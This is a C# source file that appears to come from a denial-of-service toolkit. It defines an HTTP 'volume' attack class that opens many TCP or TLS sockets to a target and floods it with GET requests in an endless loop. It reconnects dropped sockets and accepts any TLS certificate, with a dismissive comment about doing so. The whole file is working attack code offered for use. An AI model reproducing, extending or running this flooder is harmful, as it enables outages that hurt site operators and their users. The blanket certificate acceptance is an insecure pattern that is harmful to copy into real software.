using System;
using System.IO;
using System.Threading;
using System.Net.Sockets;
using System.Diagnostics;
using System.Net.Security;
using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;
using ThreadState = System.Threading.ThreadState;

namespace iNetron.Core.Methods.Vol
{
    /// <summary>
    /// A http 'volume' attack. It basically floods the server with GET requests.
    /// </summary>
    public class http
    {
        private class sock
        {
            private Random rGen;
            private StreamWriter sWriter;
            private TcpClient tClient;

            // This just accepts all SSL certificates. We don't need to worry about them being legit. Who cares, right?
            private bool AcceptAnyCert(object sender, X509Certificate certificate,
                X509Chain chain, SslPolicyErrors sslPolicyError) => true;
            public bool sendReq(string userAgent)
            {
                // Same as SlowLoris
                try
                {
                    sWriter.WriteLine("GET /?" + rGen.Next(0, 500).ToString() + " HTTP/1.1\r\n");
                    sWriter.WriteLine(userAgent + "\r\n");
                    sWriter.WriteLine("Accept-language: en-US,en,q=0.5\r\n");

                    return true;
                }
                catch
                {
                    Debug.WriteLine("Send HTTP Failed");

                    return false;
                }
            }
            public sock(string addr, bool ssl, int port)
            {
                // Create a new TCP client and connect to the target.
                tClient = new TcpClient();
                do { tClient.Connect(addr, port); } while (!tClient.Connected);

                // If using secure (https) use this:
                if (ssl)
                {
                    SslStream secStream = new SslStream(tClient.GetStream(), false, new RemoteCertificateValidationCallback(AcceptAnyCert));
                    sWriter = new StreamWriter(secStream);
                }
                else
                    sWriter = new StreamWriter(tClient.GetStream());

                sWriter.AutoFlush = true;
                rGen = new Random(DateTime.Now.Millisecond * DateTime.UtcNow.Millisecond);
            }
        }
        private string p_address = "127.0.0.1";
        private bool p_secure = false;
        private int p_port = 80;

        private string u_agent;
        private List<sock> liSocks;
        private Thread tFlood;

        public http(string ua, string address, bool secure = false, int port = 80)
        {
            p_address = address;
            p_secure = secure;
            p_port = port;

            u_agent = ua;

            liSocks = new List<sock>();

            tFlood = new Thread(thread_Flood);
        }
        ~http()
        {
            if (tFlood != null)
                tFlood.Abort();
        }
        public void createHttp(int sockets)
        {
            try
            {
                for (int i = 0; i < sockets; ++i)
                    liSocks.Add(new sock(p_address, p_secure, p_port));

                tFlood.Start();
            }
            catch { Console.Error.WriteLine("Create HTTP Fail"); }
        }
        private void thread_Flood()
        {
            while(true)
            {
                if (tFlood.ThreadState != ThreadState.Running)
                    break;

                // For every socket we have made, send a request on each one.
                for (int i = 0; i < liSocks.Count; ++i)
                {
                    try { liSocks[i].sendReq(u_agent); }
                    catch { Console.Error.WriteLine("Send HTTP GET FAILED"); liSocks[i] = new sock(p_address, p_secure, p_port); }
                }
            }
        }
    }
}